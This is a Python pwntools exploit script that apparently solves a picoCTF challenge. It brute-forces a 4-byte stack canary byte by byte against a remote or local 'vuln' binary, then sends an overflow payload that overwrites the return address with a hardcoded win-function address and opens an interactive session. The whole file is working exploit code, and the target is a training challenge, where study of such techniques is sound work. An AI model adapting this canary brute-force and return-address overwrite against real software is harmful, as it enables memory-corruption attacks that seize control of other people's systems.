from pwn import *

LOCAL = False

def new_process():
    if LOCAL:
        c = process('./vuln')
    else:
        c = remote('saturn.picoctf.net', 60464)
    return c

BUF_SIZE = 64
CANARY_SIZE = 4
WIN_ADDRESS = p32(0x08049336)

def find_canary():
    canary = ""
    for _ in range(0, 4):
        cand_byte = 0
        for i in range(0, 256):
            cand_byte = i
            c = new_process()
            c.recv() # clear how many bytes msg
            c.sendline(str(BUF_SIZE+len(canary)+1))
            c.recv() # clear "Input>" prompt
            c.sendline("A"*BUF_SIZE+canary+chr(cand_byte))
            msg = c.recvline()
            c.close()
            if b'Stack Smashing' not in msg:
                break
        canary += chr(cand_byte)

    return canary

def exploit():
    canary = find_canary()
    #  canary = "ABCD"
    print("Canary is: " + canary)

    payload = b"A"*BUF_SIZE
    payload += canary.encode()
    payload += b"BBBBCCCCDDDDEEEE" # padding, never checked what these are
    payload += WIN_ADDRESS

    c = new_process()
    c.recv() # clear how many bytes msg
    c.sendline(str(len(payload)))
    c.recv() # clear "Input>" prompt
    c.sendline(payload)
    c.interactive()

exploit()
